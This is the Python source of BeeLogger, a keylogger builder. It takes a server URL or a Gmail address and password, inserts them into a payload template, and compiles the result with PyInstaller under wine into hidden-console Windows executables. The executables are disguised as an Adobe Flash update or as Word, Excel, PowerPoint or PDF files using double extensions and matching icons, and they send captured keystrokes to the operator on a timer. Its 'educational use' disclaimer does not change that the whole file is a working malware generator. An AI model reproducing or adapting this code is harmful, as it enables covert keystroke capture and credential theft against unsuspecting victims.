#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Copyright 2017 BeeLogger
# Written by: * Alisson Moretto - 4w4k3
# Updated by: xmaster @ black-zone-1000
# https://github.com/4w4k3/BeeLogger
# https://github.com/black-zone-1000/BeeLogger/
# Licensed under the BSD-3-Clause
import os
import sys
import time
BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'
if not os.geteuid() == 0:
    sys.exit('BeeLogger must be run as root')
def clear():
    os.system('clear')
def begin_http():
    os.system('sudo rm -Rf dist')
# TEMPORARY UNAVAILABLE #    print "\n{0}You can see a list with servers and ports in SERVERS.txt on BeeLogger folder.{1}".format(GREEN,END)
    serverURL = raw_input('Type the server URL to post data to: ')
    postData = raw_input('Type the POST data format ($KeyStream$=the keys stream, $Date$-date): ')
    base64encode = raw_input('Do you want to encode the keys in Base64 (y/n): ');
    
    print '\n'
    print '[ * * * * * * * * * * * * * * * * * * * * * * * * * ]'
    print '\n   serverURL: ' + serverURL
    print '   postData: ' + postData 
    print '   Encode the keys stream in Base64: ' + str(base64encode == 'y')
    print '\n[ * * * * * * * * * * * * * * * * * * * * * * * * * ]'
    print '\n'    
    ask = raw_input('These info above are correct? (y/n) :')
    if ask == 'y':
        pass
    else:
        begin_http()
    template = open('Templates/Bee_POST.py', 'r')
    o = template.read()
    payload = '#/usr/bin/python\n'
    payload += '# -*- coding: utf-8 -*-\n'
    payload += 'SERVER_URL = ' + "'" + serverURL + "'" + '\n'
    payload += 'POST_DATA = ' + "'" + postData + "'" + '\n'
    payload += 'BASE64_ENC = ' + "'" + base64encode + "'" + '\n'
    payload += str(o)
    with open('k.py', 'w') as f:
        f.write(payload)
        f.close()	
    template.close()
def begin_mail():
    os.system('sudo rm -Rf dist')
# TEMPORARY UNAVAILABLE #    print "\n{0}You can see a list with servers and ports in SERVERS.txt on BeeLogger folder.{1}".format(GREEN,END)
    email = raw_input('Type your gmail to receive logs: ')
    epass = raw_input('Type your gmail password: ')
    print '\n'
    print '[ * * * * * * * * * * * * * * * * * * * * * * * * * ]'
    print '\n   email: ' + email
    print '   password: ' + epass 
    print '\n[ * * * * * * * * * * * * * * * * * * * * * * * * * ]'
    print '\n'    
    ask = raw_input('These info above are correct? (y/n) :')
    if ask == 'y':
        pass
    else:
        begin_mail()
    template = open('Templates/Bee_MAIL.py', 'r')
    o = template.read()
    payload = '#/usr/bin/python\n'
    payload += '# -*- coding: utf-8 -*-\n'
    payload += 'EEMAIL = ' + "'" + email + "'" + '\n'
    payload += 'EPASS = ' + "'" + epass + "'" + '\n'
    payload += str(o)
    with open('k.py', 'w') as f:
        f.write(payload)
        f.close()	
    template.close()
def warn():
    sys.stdout.write(YELLOW + '''

              \     /
          \    o ^ o    /          TO STOP SEND LOGS JUST 
            \ (     ) /                    DISABLE IT ON 
 ____________(%%%%%%%)____________                 TARGET IN MSCONFIG !
(     /   /  )%%%%%%%(  \   \     )
(___/___/__/           \__\___\___)     https://github.com/black-zone-1000/BeeLogger/
   (     /  / (%%%%%%) \  \     ) 
    (__/___/   (%%%%)  \___\__)                 
''' + RED + '''       [ Disclaimer Alert ]''' + YELLOW +  ''' 
''' + WHITE + '''   Not Responsible For Misuse ''' + YELLOW + '''
''' + WHITE + '''      or Illegal Purposes.''' + YELLOW + '''
''' + WHITE + ''' Use it just for''' + RED + ''' WORK''' + WHITE + ''' or ''' + RED + '''EDUCATIONAL''' + WHITE + ''' !
''')

def heading():
    os.system('clear')
    sys.stdout.write(YELLOW + '''

                .' '. I BEE YOU  __
       .        .   .          \(__\_/      Version: 2.3(+HTTP)
        .         .         . -{{#(|8)
          ' .  . ' ' .  . '    /(__/ \      by:''' + WHITE + ' Alisson Moretto (' + YELLOW + '4w4k3' + WHITE + ')' + '\n' + '\n' + END) 
          
    print ' {0}[{1}K{0}]{1} Generate Keylogger  {0}[{1}U{0}]{1} Update  {0}[{1}Q{0}]{1} Quit  '.format(YELLOW, WHITE) + '\n'
def pp():
    sys.stdout.write(GREEN + '''Thank You for using Bee, Think Great, Fly High!  \n''' + END)
def option():
    print ' {0}[{1}1{0}]{1} Adobe Flash Update '.format(BLUE, WHITE) + '\n' + ' {0}[{1}2{0}]{1} Fake Word docx '.format(BLUE, WHITE) + '\n' + ' {0}[{1}3{0}]{1} Fake Excel xlsx '.format(BLUE, WHITE) + '\n' + ' {0}[{1}4{0}]{1} Fᴀᴋᴇ Powerpoint pptx '.format(BLUE, WHITE) + '\n' + ' {0}[{1}5{0}]{1} Fake Acrobat pdf '.format(BLUE, WHITE) + '\n' + ' {0}[{1}6{0}]{1} Blank Executable '.format(BLUE, WHITE) 
def main():
    clear()
    warn()
    raw_input('\nPRESS [ENTER] TO CONTINUE')
    clear()
    heading()
    try:
        while True:

            header = ('{0}Bee{1} > {2}'.format(YELLOW, WHITE, END))
            choice = raw_input(header)            
            if choice.upper() == 'Q' or choice.upper() == 'QUIT':
		clear()
		pp()
                raise SystemExit
            if choice.upper() == 'K':
                option()
                print '\n NOTE: Don\'t use your personal email, make a dedicated.'
                print '\n {0}This keylogger send logs when logs > 50 chars or each 120 seconds.{1}'.format(BLUE, END)
            if choice.upper() == '6':
                begin_http()
                os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconfirm --noconsole -m Manifest/manifest.manifest -F k.py')
                os.system('rm -Rf build k.spec k.py')
                name = 'Bee.exe'
                os.rename('dist/k.exe', 'dist/' + name)
                clear()
                heading()
                os.system('sudo rm -Rf Templates/k_enc.py')
                print '\n {0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name
            if choice == '1':
                begin_http()
                os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/adobe.Bee -i Icons/flash.ico -F k.py')
                os.system('rm -Rf build k.spec k.py')
                name = 'Bee_Flash_.exe'
                os.rename('dist/k.exe', 'dist/' + name)
                clear()
                heading()                              
                print '{0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name           
            elif choice == '2':
                begin_http()
                os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/word.Bee -i Icons/word.ico -F k.py')
                os.system('rm -Rf build k.spec k.py')
                name = 'Bee_Word_.docx.exe'
                os.rename('dist/k.exe', 'dist/' + name)
                clear()
                heading()                                              
                print '{0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name
            elif choice == '3':
                begin_http()
                os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/excel.Bee -i Icons/excel.ico -F k.py')
                os.system('rm -Rf build k.spec k.py')
                name = 'Bee_Excel_.xlsx.exe'
                os.rename('dist/k.exe', 'dist/' + name)
                clear()
                heading()                                              
                print '{0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name
            elif choice == '4':
                begin_http()
                os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/powerpoint.Bee -i Icons/powerpoint.ico -F k.py')
                os.system('rm -Rf build k.spec k.py')
                name = 'Bee_Power_.pptx.exe'
                os.rename('dist/k.exe', 'dist/' + name)
                clear() 
                heading()                                              
                print '{0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name
            elif choice == '5':
                begin_http()
                os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/acrobat.Bee -i Icons/acrobat.ico -F k.py')
                os.system('rm -Rf build k.spec k.py')
                name = 'Bee_AcrobatPDF_.pdf.exe'
                os.rename('dist/k.exe', 'dist/' + name)
                clear()
                heading()                                              
                print '{0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name
            if choice.upper() == 'U' or choice.upper() == 'UPDATE':
		os.system('python2.7 updater.py')
            if choice.upper() == 'EXIT' or choice.upper() == 'CLOSE':
                clear()
		pp()
                raise SystemExit
            
    except KeyboardInterrupt:
	clear()
	pp()
        sys.exit(0)

if __name__ == '__main__':

    main()

